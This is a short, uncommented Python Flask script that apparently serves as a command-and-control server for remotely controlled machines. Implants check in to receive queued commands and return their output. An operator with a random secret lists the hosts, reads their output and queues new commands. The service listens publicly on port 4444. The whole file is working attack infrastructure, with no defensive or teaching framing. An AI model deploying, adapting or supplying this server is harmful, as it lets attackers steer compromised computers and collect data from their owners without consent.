#!/usr/bin/env python3
import collections
import datetime
import random
import string
import time
import flask

app = flask.Flask(__name__)

secret = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(8))

hosts = {}

@app.route('/', methods=['POST'])
def index():
    iden, output = flask.request.get_data(cache=False, as_text=True).split(':', 1)
    if iden not in hosts:
        hosts[iden] = {'cmd': collections.deque(), 'out': collections.deque()}
    hosts[iden]['tim'] = datetime.datetime.utcnow()
    if output:
        hosts[iden]['out'].append((datetime.datetime.utcnow(), output))
    return ':'.join(hosts[iden]['cmd'].popleft()) if hosts[iden]['cmd'] else ''
    
@app.route('/cmd', methods=['POST'])
def command():
    key, cmd, iden, parameters = flask.request.get_data(cache=False, as_text=True).split(':', 3)
    if key != secret:
        time.sleep(1)
    elif cmd == 'L':
        return '\n'.join('{}> {}'.format(v['tim'], k) for k, v in hosts.items())
    elif cmd == 'I' and iden in hosts:
        return '\n'.join('{}> {}'.format(t, o) for t, o in hosts[iden]['out'])
    elif cmd in ['T', 'N', 'C'] and iden in hosts:
        hosts[iden]['cmd'].append((cmd, parameters))
    return ''

if __name__=='__main__':
    print('SECRET:', secret)
    app.run(host='0.0.0.0', port=4444)
